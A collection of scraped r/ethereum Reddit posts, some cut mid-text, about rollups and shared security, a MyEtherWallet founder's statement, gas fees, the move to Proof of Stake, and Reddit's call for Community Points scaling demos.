discriminate what people use the chain for.That said, it is certainly concerning that a lot of activity on Ethereum seems to be speculative. This is, of course, true of all early tech. We're definitely seeing real adoption from big players as well - I don't need to repeat all the news about Visa, EIB bonds, etc. A lot of work needs to be done to onboard more of these non-degen usecases.# Rollups are centralizedIt's true that some of the early rollups have centralized sequencers. This is not a security risk, though, as fraud or validity proofs will ensure the same security as Ethereum mainnet. There is a liveness and censorship risk, and centralized sequencers are definitely not trustless systems. Fortunately, most rollups have decentralized sequencers in their roadmaps, so this is not going to be an issue for long.# Rollup-centric roadmap breaks composability ([epic'_trader](https://www.reddit.com/user/epic_trader/))Yes, and no. Within rollups, everything will be composable, but between rollups/L1 nominally hey do break composability. Fortunately, there are multiple projects hard at work to solve this, with relatively seamless L2<>L2 interoperability. It's still a work-in-progress, of course, but this is more of an engineering problem that is currently being solved than a theoretical hurdle.# Bonus: Ethereum is a frankenstein monster with two chains, two assets, ETH1 and ETH2No, there's only one ETH. While there are two chains that run in parallel right now, think of beacon chain as an incentivized testnet to ensure the brand new consensus mechanism works well. These chains will be merged in the next 9 months and it'll all be one ethereum again.# AddendumI feel like half the comments down below are oblivious to the concept of the blockchain trilemma. No project has solved it, or is even attempting to, other than Ethereum. All projects other than Bitcoin and Ethereum significantly compromise on decentralization and security to varying magnitudes, and most still can't offer the scalability Ethereum rollups offer today - let alone after data sharding goes live. Wake me up when you have a non-delegated consensus mechanism with 135,000 validators (let alone the 1 million possible) while at the same time maintaining a manageable state that can be run on a consumer laptop or a Raspberry Pi 4. Like I mentioned, most chains have a few hundred validators at most with stake delegated and centralized to them. Someone mentioned Solana - according to the project's system requirements page ( [Validator Requirements | Solana Docs](https://docs.solana.com/running-validator/validator-reqs) ) it requires a cloud instance that costs $1,200/mo to run a Solana node, with a state growing by several TBs every month. This is simply a different class of product that is in no way comparable to Ethereum. There's nothing wrong with this, and as I've mentioned above, there'll be different solutions with varying trade-offs between decentralization and transaction costs built on top of  or parallel to Ethereum.# Errata(Edited in 18 hours after the post went live)'- 90% of the comments criticizing this post seems to be around the fees. I'll once again reiterate the blockchain trilemma, and that the Ethereum ecosystem is uniquely positioned to deliver great scalability through rollups, combined with high decentralization and security. L1 gas will remain high, and that's fine, because most people will be transacting on rollups, hybrid solutions like zkPorter/Validium or even centralized sidechains. I think there's a significant mental block in thinking of rollups the same way as alternate L1s. Rollups are exactly that - direct competitors to alternate L1s, but superior to them in almost every respect. Crucially, what many seem to be misunderstanding is that no L1 can possibly offer the combined scalability the Ethereum ecosystem working together at various levels can. '- While the DAO fork was not technically a rollback, it was definitely in the spirit of one, and should be criticized as such. It was still a unique, one-time event, and all further attempts at rollbacks, most notable EIP-999, have been unanimously defeated.'- While Bitcoin mining was highly centralized in the early days, this is not a 'ninja mine'. It remains clearly a fairer launch than Ethereum's.'- While proof-of-work is undeniably inefficient, it is fair to say that proof-of-stake needs to prove itself at scale before being considered superior to proof-of-work.",False,Addressing common criticisms about Ethereum,u/[deleted],60,1692,0.96,https://www.reddit.com/r/ethereum/comments/najp2c/addressing_common_criticisms_about_ethereum/,[]

They can make a block that illegally edits the state to give them all the coins, and then withdraw the coins through the bridge, and there's no verification happening on the larger chain.* If the smaller chain is a **'sidechain'**, they **can steal everything**, for the same reason. However, **security** ***can*** **be slightly better** than fully independent L1s, because sidechains whose block headers are published to Ethereum are guaranteed to revert if Ethereum reverts, preventing thefts involving 51% attacks on Ethereum but *not* the sidechain.* If the smaller chain is a **'rollup'**, they **can delay transactions** and perhaps even force users to pay L1 fees, but they **can't steal anything**. This is because there is an on-chain mechanism (whether fraud proofs or data availability proofs) that can actually check that the events on the smaller chain leading up to the attacker's withdrawal are all valid.A couple more niche examples:* If the smaller chain is a **'plasma'**, they **can delay transactions** and force users to pay L1 fees, but they **can't steal anything**.* If the smaller chain is a **'validium'**, they can **permanently lock up all the users' money** but they **can't steal anything**. Validiums (eg. [Starkware's ImmutableX](https://medium.com/starkware/starkex-now-for-nfts-bfdc9f4655a2)) are thus an interesting middle ground. They are not quite 'true L2s' to the same extent as rollups are, because someone who takes over the validium can still deny users access to their funds and extort them, but they are nevertheless significantly more secure than sidechains, and importantly they can be as scalable as sidechains.**This is what we mean by 'shared security'. If you are hodling assets and doing stuff on the smaller chain, are you as secure as if you were doing it on the larger chain, or are you less secure?** On a rollup or a plasma, you are just as secure. On an independent L1 or a sidechain, you are much less secure. On a validium, you're somewhere in the middle.&#x200B;|'[--- Platform type ---']|'[--- Security compared to base chain ---']||:-|:-||Independent L1|very much less secure||Sidechain|much less secure||Validium|somewhat less secure||Rollup|just as secure||Plasma|just as secure|Note also that for reasons I described in [this earlier post](https://old.reddit.com/r/ethereum/comments/rwojtk/ama_we_are_the_efs_research_team_pt_7_07_january/hrngyk8/), a lot of this is actually symmetric: if you are holding ETC, you are better off holding it on a ZK rollup rooted in ETC than you are holding it wrapped on Ethereum (even if the bridge is a perfect ZK-SNARK verifier of Ethereum's consensus). It's not really about being on the biggest chain you can be. It's about the domain your activity is one being part of the same shared security zone as the domain where the assets you're using were originally issued, where a **shared security zone** is defined as 'a chain, and all other chains '[eg. rollups'] whose security is ultimately dependent only on that chain'.But this doesn't change the above categorization; it only makes it stronger, as these differences in security persist even if Ethereum itself gets 51% attacked.Some more specific examples:|'[--- Asset is issued on ---']|'[--- You are using that asset on ---']|'[--- Security level ---']||:-|:-|:-||Ethereum|Ethereum|High||Ethereum Classic|Ethereum Classic|Medium-high||Bitcoin SV|Bitcoin SV|Low||Ethereum|Avalanche|Low||Avalanche|Ethereum|Low||Ethereum|StarkEx (rollup mode)|High||Ethereum|Arbitrum|High||Optimism|Ethereum|High||Arbitrum|ZkSync|High|This is because (Ethereum, Optimism, Arbitrum, ZkSync, StarkEx rollup mode) are in the same shared security zone (as the latter four are all ultimately secured by Ethereum, or at least soon will be when the fraud proof mechanism is fully enabled with all temporary backdoors removed), but Avalanche and Ethereum Classic are not and likely never will be.BSV is insecure on BSV despite being in the same shared security zone as itself, because BSV is a weak PoW chain that is easily attackable by bored BTC and/or BCH miners and has blocks that are too large for users to verify (with no plans to add sharding/ZK-SNARK/DAS technology to fix this), so someone who 51% attacks BSV can just push invalid blocks through and users would probably have no choice but to accept them.",False,A quick reminder of what 'shared security' means and why it's so important,u/[deleted],19,1628,0.98,https://www.reddit.com/r/ethereum/comments/sgd3zt/a_quick_reminder_of_what_shared_security_means/,[]

For those of you who do not know me, I founded MyEtherWallet (MEW), and I believe that I owe our Ethereum community, and the crypto community at large, an explanation of yesterday's events.Before I do, a brief history about me: I've been intrigued by Ethereum ever since the release of their yellow paper back in 2014. Upon reading it, I realized that Vitalik was a true visionary and became infatuated with the technology behind Ethereum. Specifically, I understood all the transformative possibilities that this type of technology presented now and in the future. When the Ethereum Foundation released the Mainnet, however, I recognized that many users were struggling. With no graphical user interface, many early adopters were having difficulty accessing and transferring their Ether. I saw an opportunity to contribute to this new, emerging community, and seized it.  I began working on a user interface to be used in conjunction with, and in support of, Ethereum wallet functionality that any new crypto adopter could feel comfortable using. I released my initial version, and published it on [Reddit](https://www.reddit.com/r/ethereum/comments/3gkknd/ether_wallet_generator_for_now/) on August 11, 2015 (MEW's birthday!). I designed it to be open source so that others like me could make modifications to my existing codebase, and continue improving user-friendliness and functionality over time.However, as a core developer and programmer, business development/designing were, admittedly, not my strength. I needed someone to take the lead on that front if I wanted MEW to grow its userbase. I brought my friend, Taylor M., on board knowing that she was up to the task. Let's just say that she did not disappoint, and MEW took off much faster than either of us could have anticipated. I will always be appreciative of her efforts in helping MEW achieve the success it did.Alas, for reasons I cannot delve into here, our partnership had to end. During the transition yesterday, however, MEW's Twitter account was switched from @myetherwallet to @mycrypto, and tens of thousands of MEW followers were left scratching their heads. Indeed, the change was unexpected, and I'm still in the process of determining the justification behind the switch, and how this issue will be resolved. I don't know what the fall out from this will be ultimately, but I will not be on the offensive or defensive discussing the circumstances surrounding our decision to separate beyond my statement here.Instead, my focus will be (as it's always been) on how best to improve MEW for existing and prospective users. Security is paramount these days, and me and my new team will remain vigilant in ensuring that the MEW website, your accounts, and more importantly, your ether and tokens, are safe. Rest-assured that MEW is the same product that you trusted yesterday, and the MEW team will work tirelessly to make sure it is the product you still trust tomorrow. The Ethereum community inspired me to create MyEtherWallet, and it still inspires me today. I am not going anywhere. Furthermore, for those of you wondering where I've been or what I've been working on the past several months, I've been busy doing what I do best‚Äîso get ready for some new and exciting products/services in the pipeline. Stay tuned!In any event, I must admit that competition is a good thing because it serves as a driving force behind innovation. Look at the world around us. Complacency simply means one will get left behind. That being said, I sincerely wish Taylor M. and MyCrypto the very best. Your presence in the crypto space will undoubtedly motivate me to continue raising the bar.Thank you all for your support over the last few years, and hopefully, in the years to come. MEW's team remains committed to you, and is available to answer any and all questions or concerns you may have.

And unfortunately they're doing a damn good job of it.*](https://old.reddit.com/r/ethereum/comments/loy1qe/binance_a_centralized_exchange_is_taking_total/) got me thinking. Most people including me until recenty have been thinking that the high fees on ETH are crazy uncomfortable right now but it doesn't matter long term as it's being worked on and therefore temporary, it's just a 'pause' in its utility and all the good times will just resume once it's solved by L2, sharding or POS.The surge in BNB value is a wake up call, as the OP in the linked thread put it:> I hate that they are completely CENTRALISED but make themselves seem decentralized. They have complete control over the BNB token. **This is exactly what the crypto community feared and wanted to avoid all along.**That's exactly right, that's what we feared and should have feared much more as it gets more real every day. Especially because as another poster put it:> The open market doesn't give a shit about decentralization. If you don't agree, you're actually in the minority. That's why pancakeswap rocketed to #1. That's why Tether is used to this extent. That's why XRP is top 10. That's why exchanges control over 40% of ETH staking.That quote is frightening, it's frightening because it's true. Majority of people in general, be it traders, devs or users do not care about decentralization. And the more people from general population join the crypto space, the more it becomes the reality for that space.**That's where lies the very real danger for ETH of, not being attacked from within, but being REPLACED and OVERTAKEN by centralized pseudo-coins and once this happens it might stay that way forever given the above!**Up until now many thought that ETH is far too ahead to be challenged and we can afford a year or two until scaling solutions are deployed, but **BNB showed otherwise, it got 500% closer in *two weeks*, we *do not have* 2 years to solve this! They repeat this feat just ONCE and ETH is no longer the largest smart contract chain in crypto.**The fee issue needs to be taken seriously if we want to protect ETH, it's a very real security risk, far bigger at this point than 51% attack, or state growth, uncle rate etc. HALF of Top 10 coins are centralized pseudo-coins, the threat is real not only for ETH but all truly decentralized cryptos. So let's not underestimate it.We're bleeding developers, users, future innovation right now. I've seen multiple posts and comments about people abandoning ETH leaving for another chain because of the fees. **Once they have this bad experience and invested time and money in another chain, they're not coming back. This is 'invisible' at first, that guy who left is going to have his project completed and mature in 3-5 years but it will be too late then when we start to see it more openly, it's no stopping it then.**Also when centralized projects close in or overtake ETH even for a while that's when they're going to take full advantage of their centralized nature. **They're going to be making big bucks which are going to go toward troll farms, media, 'influencers', armies of paid devs and big institutions are going to buy in as they just LOVE centralization. It's also going to be too late once this becomes apparent.** We might end up rambling about it in an obscure corner of the internet, be ETH fanbois that nobody cares or even knows about - it might seem unimaginable now but once this train gets rolling it might end up exactly like that 5-10 years from now, crypto moves at lightspeed.If you're thinking that rollups will solve this, think again, L2 is complex and suitable only for a very narrow set of use cases, look at LN on BTC, it totally flopped. Crypto is complex enough, L2 is a level above that and it takes years to make the UX good enough. L2 on ETH breaks composability or makes it complex to the power of 2. **Are we willing to gamble the future of ETH on the hope that L2 gets adopted quickly enough contrary to all experience until now? That carrot has been dangled with SegWit/LN on BTC for years now, let's please not make the same mistake.**So what am I proposing? As a first step we need to alleviate the pressure *right now*, that can be done ONLY by raising the block gas limit substantially ASAP, at least double it, ideally quadruple it. We've had time for L2, other scaling solutions a year ago, but that ship has sailed, there is no more time.If you're thinking about the drawbacks of raising the limit, think it in a context of a real threat to ETH security - would it be worth it if there was an imminent threat of a 51% attack? Would it be worth to raise the limit to prevent the attack then? Because that's the situation we're in, just more insidious as the damage caused today is going to show itself only in a few years when there is no longer anything we can do about it.But I do not think there are any real showstoppers here, uncle rate is at ATL, storage and state growth doesn't matter if we can handle it now as in a few years it will become orders of magnitude easier to handle, for the comuters in 5-10 years it will be just a immaterial blip.This will buy us time to develop L2 and rollups, which in turn buys us time for sharding and POS but we NEED to kick the can down the road right now as to stop the bleeding.**Anyway, if you take anything from this write up, even if you disagree with some suggestions, it's that high fees ARE A SERIOUS SECURITY RISK on par with a 51% attack. And it should be taken just as seriously, by the devs and by the users. Beware and be suspicious of people minimizing that risk (in a reasonable way ofc), troll farms may soon be in full swing and the likes of BNB would like nothing more than for us to underestimate this threat.**",False,"The biggest security threat to Ethereum is not a 51% attack, it's getting replaced by centralized pseudo-cryptocurrency",u/[deleted],24,1468,0.94,https://www.reddit.com/r/ethereum/comments/lpcalp/the_biggest_security_threat_to_ethereum_is_not_a/,[]

So here are a bunch of common questions/takes I see, boiled down in quick bullet points like I did in [my previous post](https://www.reddit.com/r/ethereum/comments/s8mnwb/a_collection_of_various_things_the_average/) that was more about Ethereum in general.I plan on lazily linking this thread whenever I see those points being brought up, and I encourage everyone to do the same and correct me if I got anything wrong or suggest any addition.## Wat merge?A lot more info can be found on [ethmerge.com](https://ethmerge.com/) so I will keep this section light* When the merge happens, Ethereum will be secured by Proof of Stake instead of Proof of Work.* The Merge is not 'ETH 2.0', there is no ETH 2.0, [it's an obsolete term.](https://blog.ethereum.org/2022/01/24/the-great-eth2-renaming/)* **If you currently hold ETH, you don't need to do anything.** You will still hold the same amount of ETH after the merge, there is no 'ETH2 coin', no need to migrate anything, etc. Everything sames exactly the same, only the consensus mechanism changes under the hood.* It's called 'merge' because it's about *merging* the Beacon Chain (*consensus layer*) with the current chain (*execution layer*) and ditching the proof of work part of the execution layer.* If you don't know, 'consensus' is just a fancy word for the goal of ordering transactions and getting some economic guarantee that this order won't change. Both PoW and PoS achieve consensus by different means:  * PoW: 'It costs too much to mess up with the order of blocks, playing by the rules is more lucrative.'  * PoS: 'It costs too much to mess up with the order of blocks, because if I do I'll lose all the money I put up as collateral.'* Since it's only the consensus mechanism changing, **Proof of Stake by itself will not lower gas fees significantly**.## Why merge?* Lower security costs since there's less energy needed to achieve consensus.  * For PoW you need miners to be able to *at least* cover all the hardware and energy they use otherwise no one will mine. This requires a big issuance that is quickly sold for fiat to pay the bills.    * For PoS you just need to give some yield to stakers to make people want to deposit capital rather than just invest it elsewhere. No big bills to pay beyond an ordinary computer and an internet connection, so the yield just has to reflect the opportunity costs and risks involved.* More sustainability:  * The security of a blockchain is basically proportional to the value of its coin. This is true for both PoW (more valuable coin rewards = more reasons to play by the rules = more miners = harder to mess up the consensus) and PoS (more valuable staked coins = more reasons to play by the rules to avoid losing the staked coins)  * A newly issued coin is essentially value being taken from all holders of the coin and being redistributed to someone. All else equal, selling that coin for fiat extracts value out of the network.* It opens the door for many scaling solutions in the future, namely data sharding, statelessness, light clients, and [more](https://twitter.com/VitalikButerin/status/1466411377107558402)* It helps reduce some complexity of the code going forward, by separating concerns between execution and consensus.* Appeasing the environment and gamers is certainly a nice side-effect, but not really a major reason behind the switch to PoS, since it's mostly about externalities over which Ethereum as a protocol doesn't have much control (source of energy production, GPU supply chains, etc.)## Wen merge?* It happened on September 15th, 2022## Nope, your a idiot. They will delay it like they always have in the past. They promised it years ago and still haven't delivered.Believe or not this was a common talking point before the merge## Those millions of ETH staked will crash the price the very moment they're unlocked LOLFor sure, there will be plenty of stakers who will want to finally take profit, especially those who locked their ETH back when 32 ETH was worth $10k. But there's plenty more to consider on the other side of the equation:* The merge doesn't unlock any ETH. Withdrawals will come in the first hard fork following the merge, likely 6-8 months after. That's months of no proof of work issuance (~13k ETH/day) being sold off *and* no proof of stake issuance coming into circulation.* Just like how there's a queue to deposit ETH, there will be [a queue to withdraw it.](https://github.com/ethereum/annotated-spec/blob/master/phase0/beacon-chain.md#how-does-eth2-proof-of-stake-work). Assuming a mass sell-off event, everyone is in that queue, limited at a rate of 1125 valitors per day. So there's no 'opening the floodgates' moment. Everyone unstaking would literally take over a year. A year of ~38k ETH/day entering back into circulation (or... roughly 1% of average daily volume)* After the merge, validators will start receiving fee rewards as well, doubling the yield [by some estimates](https://docs.google.com/spreadsheets/d/1vrK5sY5ooq-F8dcyRhmmAJ5YtgkvWKWP3OfGCZIYxSA/edit#gid=0). There are thousands of people waiting in line to stake *right now*. They're okay with a 5% yield on their ETH, I don't think they're gonna yeet the moment it becomes 10% lol* The biggest risk involved in staking is *by far* the merge. Something catastrophic could go wrong, yet people have been staking and locking up their ETH for over a year despite this risk and despite the ETH being locked until an unknown floating date. How many people/institutions are waiting on the sidelines for this risk to disappear before jumping in?* And don't forget stakers exiting means fewer validators which means higher rewards for the stakers who don't exit. It also means more incentives for other people to *start* staking if they weren't before...* But of course it's crypto, and crypto's gonna crypto. The merge will bring excitement and volatility and possibly a sell-the-news dip, who knows. I don't pretend to know the future, but the way I see it it's much more likely way more ETH will flow *into* staking than out of it.## If proof of stake is so good, then how come Ethereum didn't go with that from the start?* Proof of Work is easy to conceptualize and implement, Proof of Stake isn't. Especially when back in 2014 it was mostly a theoretical concept still being researched, with some blockchain implementing some version of it.* There were several fundamental problems with PoS that needed to be overcome from a research perspective before thinking about implementing it. * There is no one-size-fits-all for Proof of Stake. Every PoS blockchain comes with its own PoS specification that has pros and cons on various aspects, so it's not as simple as 'but this other blockchain did it, why can't ethereum just do the same thing'* Starting as a proof of work chain had the benefit of letting anyone mine coins on their own without anyone's permission, which helped the coin distribution become way better than those newer chains that are proof of stake from the start and have to decide how to allocate the initial coins, which can't really be done permissionlessly.* Related to above: Yes, there was still a premine/presale for Ethereum, but it has now been diluted to half the supply after years of mining and multiple bull/bear cycles making that ETH swap hands, bringing the distribution [closer to Bitcoin's](https://medium.com/@adamscochran/the-10k-audit-42c100dd32bb). So it's not that big of a deal in 2022 when Ether as an asset is extremely liquid and easy to acquire. ## Nah, this is really just a ploy to screw over the miners one last time after years of hard work* PoS has been the eventual goal since [day 1](https://blog.ethereum.org/2014/07/22/launching-the-ether-sale/), everyone mining was always aware that it would end one day. There is no rugpull or unfairness going on here.* Economic factors trump any kind of miner-blockchain loyalty. You can kinda view the blockchain as a business and the miners as employees:  * Miners/employees have been paid for the service they provide (namely, secure consensus) with the block rewards. The paycheck is an expense for the employer and it comes from diluting the value of existing coins from holders (see above in 'why merge?')  * Miners go to the chain offering the highest rewards, most of them would ditch Ethereum in a heartbeat if another GPU minable coin gave out more rewards.   * Similarly, Ethereum will pay less for the service it requires if stakers can do it for way cheaper. * It's not entirely exclusive. Miners can also be holders of the coin, and users of the blockchain. Nothing prevents them from holding their rewards and becoming stakers too.## The coin stops having inherent value if you're not spending real world energy to mine itI don't really buy this argument. There is nothing magical about computing hashes over and over until you land on one that fits arbitrary requirements. I mean, you could have a proof of work blockchain where the work is done by solving sudoku puzzles and it would work exactly the same: NP-complete problem, hard to compute one way but easy to verify a solution once one has been found. That doesn't mean solving sudoku inherently brings value into the world. Cranking up the mining difficulty of a coin doesn't magically make everyone richer, it just makes mining less profitable ‚Äì unless of course demand goes up too, which so far hasn't been too much of a problem in the crypto world.The way I see it, the value of a coin ultimately comes from supply and demand, and the demand comes from how valuable the blockspace is. People need ETH to buy the blockspace, regardless of whether that ETH is generated by a miner or a staker. Sure, the more miners there are the higher the security/decentralization which further increases the value proposition of the blockspace in a positive feedback loop, but [feedback loops exist in Proof of Stake Ethereum too](https://i.imgur.com/3bPV35a.png) and they're super cool too!## Proof of Stake is a recipe for total centralization* It's basically the same as Proof of Work but slightly different. 'Better' or 'worse' really depends on your opinion. The way I see it, PoW is really just PoS with extra steps.* Ethereum as a community values decentralization highly, any potential centralization vector is addressed by the research team to come up with ways to mitigate it, even if it's at the cost of other important stuff like scaling (e.g. keeping gas limits low so more nodes can participate in decentralization, even if that results in congestion and high fees)* There **are** shortcomings currently, decentralization is a spectrum and a process and we're not there yet, and for the time being there are many centralization crutches that need to go away on the long term. That said, none of these crutches represent existential risks for the network, and for practically any 'it's centralized because X' statement, there is an item on [the roadmap](https://twitter.com/VitalikButerin/status/1466411377107558402) addressing X. I personally find it much more fascinating to come up with a whole bunch of stuff to solve X rather than give up and say 'it can't be done because of X'. * Something interesting about Ethereum's PoS design that is often overlooked: Quadratic penalties. A single validator going down, messing up, or downright attacking the network doesn't get penalized very badly. A thousand validators doing it at the same time get penalized much more heavily.   * This means that if you're a megawhale with thousands of validators, it's in your own best interest to spread them out, avoid cloud hosting, use different clients, etc. Sure, the capital is still concentrated, but at least the points of failures are distributed which is good for the health of the network overall.  * Compared to a big mining operation that relies on a central location to amortize costs, which can be spotted from energy usage and shut down if the authorities don't like it. It's hard to move mining equipment across the world, but staking only relies on private/public keys and not any actual hardware beyond a consumer grade computer.## PoS is really just 'who has money makes more money'* Yes. Unfortunately we live in a world of high wealth inequality. Blockchains don't fix that. * It's also true of proof of work: Whoever has money can buy more mining rigs and make more money. Except with mining, the ROI becomes better with economies of scale: Centralized mining operations have the big bucks to get bulk/discount rates on hardware and move to the places with cheap electricity. The solo miner simply can't realistically compete. With Proof of Stake, everyone earns the same yield proportionally, where they stake $10 or $10M.* '*They may be centralized, but those big mining operations have no reason to attack the network and weaken it since they dumped millions in infrastructure*'....... so you're saying you're fine with big centralized actors existing, as long as they have some kind of a big *stake* in the network?## Passive interest on your deposit though? Printing money out of thin air? That's literally central banks and fiat part 2 electric boogaloo* You have to really stretch it to make this case, but I've seen people do that lol. Those takes usually begin with 'proof of stake is nothing new'* There's still 'work' being done by validators: creating blocks and validating other blocks. It's just that the work done is composed entirely of the *actually useful work* that the blockchain needs to reach consensus, instead of computing hashes over and over again until one of them meets an arbitrary requirement. * It's not really 'free money being printed out of thin air', there are still costs involved in staking capital, they're just more abstract and less direct than energy bills:  * Opportunity costs ‚Äì Why stake at all if another investment offers you a better yield?  * Illiquidity ‚Äì From the moment you deposit, your capital is locked up, queued up until your validator is active, then when you withdraw there is yet another queue before getting it back.  * Inherent risks ‚Äì It's still a fairly new thing, something could go wrong, there could be a critical bug, network could get attacked, your staking hardware could get compromised, etc.  * Volatility ‚Äì at the end of the day it's still a volatile asset, if you're the kind of investor who denominates their investments in their country's fiat currency, then a 5% yield on an asset that can drop 30% overnight isn't all that great (the upside of 5% yield on an asset that doubles is pretty great though, turn that 100% gain into 110%)  * Maintenance ‚Äì You still have to maintain and secure your validator, ensure 100% uptime, update software, etc. * Here's where it gets nifty: The more stakers there are, the lower the individual rewards get. This basically means that all those costs above will get priced by the market itself. It's easy to see why: If the staking yield is too low, then the rewards don't justify the costs and people will pull out and invest elsewhere, bringing the yield back up. Likewise if it's too high, that'll attract more capital and bring it back down. * As far as inflation goes: Let's say the market as a whole decides that 5% is the ideal yield, of which 3% comes from issuance. That works out to about 30 million ETH staked printing 900 thousand new ETH per year. At a total supply of 120 million ETH, that's an inflation rate of 0.75%. Which is outpaced by EIP1559 burn as long as gas fees are at least 23 gwei. (I cannot stress this enough: *Ether-the-asset will become a yield-bearing deflationary asset very soon*)* '*Nice math but there's no supply cap + they change the monetary policy all the time*'   * The goal has been 'minimum viable issuance to secure the network' for years, priorizing network security over an arbitrary supply cap.    * No update to the monetary policy has ever increased supply inflation. Low inflation rate (specifically *dis*inflation) has been the goal since day 1.  * There will be an equilibrium acting as an effective supply cap ‚Äì decided again by market forces valuing Ethereum's blockspace ‚Äì once the rate of EIP1559 burn matches the rate of issuance. That's super nifty if you ask me.* So yeah, there's no 'central Ethereum bank' adjusting rates arbitrarily and printing money to cronies. The market itself dictates how much inflation/deflation there is, no single entity can control it the way a central bank controls fiat inflation rates.## Whales have all the money needed to take over and change the rules and slash honest stakers* No. Ethereum has no on-chain governance of any kind for this reason. Protocol updates are a community effort (*Layer 0*) and you don't need any money staked to call out bad ideas and participate in the process.* This is exactly the same as Proof of Work: Even if you have 99% of the hashpower, you can't make invalid transactions that steal people's money without their private keys, or change protocol rules, or really do anything beyond reorganizing blocks. The 1% of honest nodes will reject any block that don't follow the rules and you'll be mining on an invalid/useless chain. Now replace hashpower/mining with stake/staking and the same holds true for Proof of Stake (with the difference that someone caught reorganizing blocks will have their entire stake destroyed, whereas the blockchain can't exactly destroy mining rigs)* And simply put, there is a fuckton of ETH involved. 10 million and counting and that's *before the merge*. At current prices that's roughly 30 billion dollars. Both 'amount of ETH staked' and 'value of ETH' are projected to go up, so attacks become increasingly unlikely due to the sheer economic cost involved in doing an attack ‚Äî *once* ‚Äî and the absurdity of acquiring that much ETH in the first place if the attack comes from an outside actor (where would you buy 10 million ETH to have 51% of the stake? 20M?)## 32 ETH is way too much, the average person doesn't have that much* I agree it's a lot. There are some ideas of how it could be lowered ([better signature aggregation](https://www.reddit.com/r/ethereum/comments/rwojtk/ama_we_are_the_efs_research_team_pt_7_07_january/hrmt6o0/) or [a rotating cap of active validators](https://ethresear.ch/t/simplified-active-validator-cap-and-rotation-proposal/9022)) but they don't seem to be very high on the priority list currently, as opposed to making sure the base layer is truly secure.* The reason for such a high number is it has to fall in a technical sweetspot. In a nutshell, it has to be low enough to be accessible and have enough validators to secure the chain, but high enough to not have too many validators and bloat the chain with overhead. And having a fixed amount for each validator reduces a lot of the complexity by having each validator weighted exactly the same in the distributed randomness process of who gets to produce each block.* There is a whole bunch of [math involved](https://thomasborgers.medium.com/ethereum-2-0-economic-review-1fc4a9b8c2d9) to arrive at 32 ETH from a technical standpoint, back when 32 ETH was worth about 7000 USD. [Earlier math from 2017](https://medium.com/@VitalikButerin/parametrizing-casper-the-decentralization-finality-time-overhead-tradeoff-3f2011672735) even suggested over 1000 ETH minimum. * Thankfully, just like mining pools exist, there are staking pools to allow staking in smaller amounts. It doesn't necessarily fly in the face of the 'not your keys not your coins' mantra, thanks to things like [RocketPool](https://rocketpool.net/), [Secret Shared Validators](https://medium.com/coinmonks/secret-shared-validators-on-ethereum-2-0-ea29ab380016) (not yet launched) which use smart contracts to be permissionless, decentralized and non-custodian. And because of the quadratic penalties mentioned above, I believe decentralized staking operations will outperform the centralized ones on the long run. I recommend superphiz's [guide to staking](https://www.reddit.com/r/ethstaker/comments/t1xpr5/how_to_stake_on_ethereum_march_2022_edition/) for more info. And obviously, I admit staking through exchanges is yucky if you value decentralization* Related to above, stuff like Rocket Pool is better viewed as a higher-level abstraction to base staking, rather than 'just a staking pool'. I go into more details on this [here](https://www.reddit.com/r/ethereum/comments/tijcq1/stuff_rethereum_should_know_proof_of_stake_edition/i1gd27b/?context=1) for those interested.## PoS hasn't been proven, while we know PoW worksThat's actually totally fair and there is no real rebuttal to this, obviously. Only time will tell. I just think it's irrelevant in the context that Ethereum *is* switching to PoS and was always going to. If you don't believe in it, don't participate/invest in it. I do personally believe in a long term sustainable PoS Ethereum, but even then I'm glad good ol' boring-by-design Bitcoin will be there chugging its proof of work along.It's all part of the great crypto experiment of our lifetime. Either it's just a fad and will fail into obscurity, which would be a bummer for sure, or we'll have succeeded in creating monster robust networks capable of outlasting humanity. To achieve that, prioritizing decentralization is key. Which is something I mainly just see in Bitcoin and Ethereum, despite the widely different philosophies. It's why I'm glad to have both to truly see what's what on the long term.## I have more questionsidk ask them in the comments, I'm sure I forgot stuff.

It's time to let the Ethereum community hear about it. Send your demo by July 31, 2020.**This is your chance to earn some fame but, to be clear, there is no prize if your solution is chosen or modified to meet Reddit's needs. Our lawyer made us write this.https://preview.redd.it/q7hhi6lzlp551.png?width=1200&format=png&auto=webp&v=enabled&s=b02447f4ea31447f58445d393fb9d95b95718a2a# The GoalIn conjunction with the Ethereum Foundation, Reddit is inviting Ethereum scaling projects to show the community how your scaling solution can be used to bring [Community Points](http://reddit.com/community-points) to mainnet. Our goal is to find a solution that will support hundreds of thousands of Community Points users on mainnet today, and can eventually scale to all of Reddit (430 million monthly users).We've evaluated some of the most promising scaling solutions, and have learned a few things:1. There are plenty of awesome projects that we don't know about yet. We seem to learn about a promising new scaling solution every day.2. Most existing scaling solutions focus on the exchange use case, which favors optimizing for transfers. Many of these designs don't take into consideration the costs of obtaining tokens or entering the scaling system, which can be significant. Community Points distributions have cost an order of magnitude more gas than all other operations combined, primarily due to on-chain storage costs associated with onboarding new users.3. It's unclear how to determine the best solution. There is a lot of code, a lot of documentation, and a lot of hype out there. But there are very few objective real-world reviews or comparisons of various products/implementations.4. We need the Ethereum community's help to figure this out.Do you have a scaling project that meets the criteria below? If so, share your demo by **July 31, 2020.** Please note that all demos need to simulate Community Points usage for 100,000 users.We also invite all scaling experts in the Ethereum community to comment on any demos submitted to enable a better understanding of the trade-offs and compromises between different solutions.We will review the demos and plan to share any updates by September. While we don't expect any novel scaling projects, we hope that you, the Ethereum scaling expert, can show us how to scale Community Points.**Demos should include:**1. A live proof of concept showing hundreds of thousands of transactions2. Source code (for on & off-chain components as well tooling used for the PoC). The source code does not have to be shared publicly, but if Reddit decides to use a particular solution it will need to be shared with Reddit at some point3. Documentation   1. How it works & scales   2. Cost estimates (on-chain and off-chain)   3. How to run it   4. Architecture   5. APIs (on chain & off)   6. Known issues or tradeoffs4. Summary of cost & resource information for both on-chain & off-chain components used in the PoC, as well as cost & resource estimates for further scaling. If your PoC is not on mainnet, make note of any mainnet caveats (such as congestion issues).# Requirements**Scaling.** This PoC should scale to the numbers below with minimal costs (both on & off-chain). There should also be a clear path to supporting hundreds of millions of users.* Over a 5 day period, your scaling PoC should be able to handle:   * 100,000 point claims (minting & distributing points)   * 25,000 subscriptions   * 75,000 one-off points burning   * 100,000 transfers**Decentralization.** Solutions should not depend on any single third-party provider.* We prefer solutions that do not depend on specific entities such as Reddit or another provider, and solutions with no single point of control or failure in off-chain components, but recognize there are numerous trade-offs to consider**Usability.** Scaling solutions should have a simple end user experience.* Users shouldn't have to maintain any extra state/proofs, regularly monitor activity, keep track of extra keys, or sign anything other than their normal transactions* Transactions complete in a reasonable amount of time (seconds or minutes, not hours or days)* Free to use for end users (no gas fees, or fixed/minimal 